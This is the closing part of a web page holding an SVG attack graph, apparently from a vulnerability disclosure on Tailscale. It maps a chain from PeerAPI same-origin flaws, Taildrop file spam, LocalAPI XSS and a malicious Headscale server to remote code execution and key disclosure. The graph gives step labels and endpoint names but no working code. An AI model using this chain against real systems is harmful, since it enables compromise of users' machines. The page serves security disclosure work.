<!-- PeerAPI is same-origin->Persistant file in Taildrop inbox -->
<g id="edge10">
<title>PeerAPI is same-origin-&gt;Persistant file in Taildrop inbox</title>
<path fill="none" stroke="#404040" d="M373.8613,-725.3623C401.0987,-707.6075 443.4824,-679.9796 473.5361,-660.3891"></path>
<polygon fill="#404040" stroke="#404040" points="475.5832,-663.2327 482.0493,-654.8398 471.7606,-657.3685 475.5832,-663.2327"></polygon>
<text text-anchor="middle" x="510.4182" y="-694.2" font-family="sans-serif" font-size="14.00" fill="#000000">Spam /v0/put/</text>
<text text-anchor="middle" x="510.4182" y="-677.4" font-family="sans-serif" font-size="14.00" fill="#000000">if (Taildrop enabled)</text>
</g>
<!-- Env disclosure -->
<g id="node12">
<title>Env disclosure</title>
<polygon fill="none" stroke="#000000" points="316.6103,-655.2 201.6103,-655.2 201.6103,-619.2 316.6103,-619.2 316.6103,-655.2"></polygon>
<text text-anchor="middle" x="259.1103" y="-633" font-family="sans-serif" font-size="14.00" fill="#000000">Env disclosure</text>
</g>
<!-- PeerAPI is same-origin->Env disclosure -->
<g id="edge12">
<title>PeerAPI is same-origin-&gt;Env disclosure</title>
<path fill="none" stroke="#404040" d="M286.4776,-728.3372C276.2186,-723.1947 266.8253,-716.2301 260.4027,-706.8 252.3505,-694.9774 251.4678,-679.2093 252.8463,-665.6712"></path>
<polygon fill="#404040" stroke="#404040" points="256.3629,-665.8105 254.3428,-655.41 249.4362,-664.8002 256.3629,-665.8105"></polygon>
<text text-anchor="middle" x="297.4641" y="-685.8" font-family="sans-serif" font-size="14.00" fill="#000000">GET /v0/env</text>
</g>
<!-- PeerAPI is same-origin->Tailnet information disclosure -->
<g id="edge13">
<title>PeerAPI is same-origin-&gt;Tailnet information disclosure</title>
<path fill="none" stroke="#404040" d="M347.1103,-724.7239C347.1103,-671.7383 347.1103,-516.4962 347.1103,-452.1002"></path>
<polygon fill="#404040" stroke="#404040" points="350.6104,-451.8735 347.1103,-441.8735 343.6104,-451.8736 350.6104,-451.8735"></polygon>
<text text-anchor="middle" x="410.2916" y="-579" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†GET /v0/magicsock</text>
</g>
<!-- RCE -->
<g id="node10">
<title>RCE</title>
<polygon fill="none" stroke="#000000" points="199.1103,-36 145.1103,-36 145.1103,0 199.1103,0 199.1103,-36"></polygon>
<text text-anchor="middle" x="172.1103" y="-13.8" font-family="sans-serif" font-size="14.00" fill="#000000">RCE</text>
</g>
<!-- Malware sitting on machine->RCE -->
<g id="edge9">
<title>Malware sitting on machine-&gt;RCE</title>
<path fill="none" stroke="#404040" stroke-dasharray="5,2" d="M119.93,-565.0632C120.8183,-543.819 122.1103,-507.5623 122.1103,-476.4 122.1103,-476.4 122.1103,-476.4 122.1103,-123.6 122.1103,-94.6216 137.681,-65.1004 151.444,-44.6665"></path>
<polygon fill="#404040" stroke="#404040" points="154.4918,-46.417 157.3791,-36.2231 148.765,-42.3915 154.4918,-46.417"></polygon>
<text text-anchor="middle" x="224.5735" y="-322.2" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†Bug 3: MotW not set by Taildrop</text>
<text text-anchor="middle" x="224.5735" y="-305.4" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†if (user launches executable)</text>
</g>
<!-- Persistant file in Taildrop inbox->LocalAPI is same-origin -->
<g id="edge11">
<title>Persistant file in Taildrop inbox-&gt;LocalAPI is same-origin</title>
<path fill="none" stroke="#404040" d="M511.1544,-619.1527C513.748,-603.4112 519.5366,-580.7257 532.2891,-565.2 536.571,-559.987 541.8162,-555.3996 547.4509,-551.4003"></path>
<polygon fill="#404040" stroke="#404040" points="549.3991,-554.3087 555.9183,-545.9571 545.6138,-548.4205 549.3991,-554.3087"></polygon>
<text text-anchor="middle" x="595.5209" y="-587.4" font-family="sans-serif" font-size="14.00" fill="#000000">Bug 6: LocalAPI XSS</text>
<text text-anchor="middle" x="595.5209" y="-570.6" font-family="sans-serif" font-size="14.00" fill="#000000">if (Windows)</text>
</g>
<!-- Node Private Key disclosure->Impersonation on Tailnet -->
<g id="edge15">
<title>Node Private Key disclosure-&gt;Impersonation on Tailnet</title>
<path fill="none" stroke="#404040" d="M866.5004,-405.3948C867.7302,-390.1064 871.6905,-368.4963 883.6909,-354 887.5663,-349.3186 892.1862,-345.2132 897.2127,-341.6196"></path>
<polygon fill="#404040" stroke="#404040" points="899.4296,-344.3579 905.9961,-336.0434 895.6778,-338.4483 899.4296,-344.3579"></polygon>
<text text-anchor="middle" x="959.32" y="-375" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†Unknown preconditions, ¬†</text>
<text text-anchor="middle" x="959.32" y="-358.2" font-family="sans-serif" font-size="14.00" fill="#000000">untested</text>
</g>
<!-- Target joins malicious Headscale -->
<g id="node16">
<title>Target joins malicious Headscale</title>
<ellipse fill="none" stroke="#000000" cx="490.1103" cy="-318" rx="139.4613" ry="18"></ellipse>
<text text-anchor="middle" x="490.1103" y="-313.8" font-family="sans-serif" font-size="14.00" fill="#000000">Target joins malicious Headscale</text>
</g>
<!-- Pending ControlURL change->Target joins malicious Headscale -->
<g id="edge18">
<title>Pending ControlURL change-&gt;Target joins malicious Headscale</title>
<path fill="none" stroke="#404040" d="M532.2372,-408.1857C513.5804,-402.3789 496.7373,-395.2988 491.1355,-387.6 482.58,-375.842 481.8407,-359.7605 483.4601,-346.0176"></path>
<polygon fill="#404040" stroke="#404040" points="486.9267,-346.505 485.0678,-336.0745 480.0164,-345.3877 486.9267,-346.505"></polygon>
<text text-anchor="middle" x="534.0977" y="-366.6" font-family="sans-serif" font-size="14.00" fill="#000000">Await reboot ¬†¬†</text>
</g>
<!-- Pending ControlURL change->Target joins malicious Headscale -->
<g id="edge19">
<title>Pending ControlURL change-&gt;Target joins malicious Headscale</title>
<path fill="none" stroke="#404040" d="M595.5856,-405.5275C593.3979,-390.1136 588.0725,-368.2485 575.1103,-354 569.8782,-348.2487 563.5764,-343.3844 556.7982,-339.2774"></path>
<polygon fill="#404040" stroke="#404040" points="558.456,-336.1948 548.0025,-334.4704 555.0991,-342.3374 558.456,-336.1948"></polygon>
<text text-anchor="middle" x="647.1149" y="-375" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†PUT profile</text>
<text text-anchor="middle" x="647.1149" y="-358.2" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†if (future version)</text>
</g>
<!-- Target joins malicious Headscale->RCE -->
<g id="edge23">
<title>Target joins malicious Headscale-&gt;RCE</title>
<path fill="none" stroke="#404040" stroke-dasharray="5,2" d="M424.992,-301.9824C339.9835,-279.6023 198.4804,-236.7991 168.6369,-193.2 138.4002,-149.0266 151.3697,-82.8078 162.436,-45.7173"></path>
<polygon fill="#404040" stroke="#404040" points="165.8084,-46.6603 165.4693,-36.0709 159.1308,-44.5605 165.8084,-46.6603"></polygon>
<text text-anchor="middle" x="303.847" y="-180.6" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†Bug 2: Control pops SMB executable path ¬†¬†¬†</text>
<text text-anchor="middle" x="303.847" y="-163.8" font-family="sans-serif" font-size="14.00" fill="#000000">if (user clicks through warning)</text>
</g>
<!-- Local network access -->
<g id="node17">
<title>Local network access</title>
<polygon fill="none" stroke="#000000" points="752.6103,-247.2 601.6103,-247.2 601.6103,-211.2 752.6103,-211.2 752.6103,-247.2"></polygon>
<text text-anchor="middle" x="677.1103" y="-225" font-family="sans-serif" font-size="14.00" fill="#000000">Local network access</text>
</g>
<!-- Target joins malicious Headscale->Local network access -->
<g id="edge20">
<title>Target joins malicious Headscale-&gt;Local network access</title>
<path fill="none" stroke="#404040" d="M585.8241,-304.8222C615.661,-299.0911 643.742,-291.4865 655.1103,-282 662.7253,-275.6454 667.7471,-266.2127 671.04,-257.0707"></path>
<polygon fill="#404040" stroke="#404040" points="674.4125,-258.0101 673.9755,-247.4243 667.7158,-255.9722 674.4125,-258.0101"></polygon>
<text text-anchor="middle" x="816.0987" y="-269.4" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†¬†LocalAPI + Control configure target as exit node</text>
</g>
<!-- Malware placed on Desktop -->
<g id="node18">
<title>Malware placed on Desktop</title>
<ellipse fill="none" stroke="#000000" cx="464.1103" cy="-229.2" rx="119.7675" ry="18"></ellipse>
<text text-anchor="middle" x="464.1103" y="-225" font-family="sans-serif" font-size="14.00" fill="#000000">Malware placed on Desktop</text>
</g>
<!-- Target joins malicious Headscale->Malware placed on Desktop -->
<g id="edge21">
<title>Target joins malicious Headscale-&gt;Malware placed on Desktop</title>
<path fill="none" stroke="#404040" d="M480.3182,-299.7016C477.6656,-294.1416 475.0149,-287.9313 473.1481,-282 470.702,-274.2282 468.8716,-265.592 467.522,-257.5932"></path>
<polygon fill="#404040" stroke="#404040" points="470.9631,-256.9392 466.0135,-247.5716 464.0411,-257.9812 470.9631,-256.9392"></polygon>
<text text-anchor="middle" x="565.0914" y="-269.4" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†Taildrop within new Tailnet ¬†¬†¬†</text>
</g>
<!-- Windows Username known -->
<g id="node19">
<title>Windows Username known</title>
<ellipse fill="none" stroke="#000000" cx="391.1103" cy="-123.6" rx="118.1082" ry="18"></ellipse>
<text text-anchor="middle" x="391.1103" y="-119.4" font-family="sans-serif" font-size="14.00" fill="#000000">Windows Username known</text>
</g>
<!-- Malware placed on Desktop->Windows Username known -->
<g id="edge22">
<title>Malware placed on Desktop-&gt;Windows Username known</title>
<path fill="none" stroke="#404040" d="M461.6874,-211.1771C458.9521,-196.2044 453.3268,-174.9469 442.1103,-159.6 438.8728,-155.1703 434.9213,-151.0848 430.6648,-147.3805"></path>
<polygon fill="#404040" stroke="#404040" points="432.7773,-144.589 422.7621,-141.1326 428.436,-150.0801 432.7773,-144.589"></polygon>
<text text-anchor="middle" x="551.4199" y="-172.2" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†Bug 2: Control pops SMB path</text>
</g>
<!-- Windows Username known->RCE -->
<g id="edge24">
<title>Windows Username known-&gt;RCE</title>
<path fill="none" stroke="#404040" d="M355.4367,-106.3985C314.8442,-86.8251 248.9152,-55.0347 208.1649,-35.3852"></path>
<polygon fill="#404040" stroke="#404040" points="209.6521,-32.2167 199.1243,-31.026 206.6117,-38.522 209.6521,-32.2167"></polygon>
<text text-anchor="middle" x="437.556" y="-75" font-family="sans-serif" font-size="14.00" fill="#000000">Bug 2: Control pops malware path</text>
<text text-anchor="middle" x="437.556" y="-58.2" font-family="sans-serif" font-size="14.00" fill="#000000">Bug 3: Mark of the Web not set by Taildrop</text>
</g>
</g>
</svg>
</div></div>
  </body>
</html>
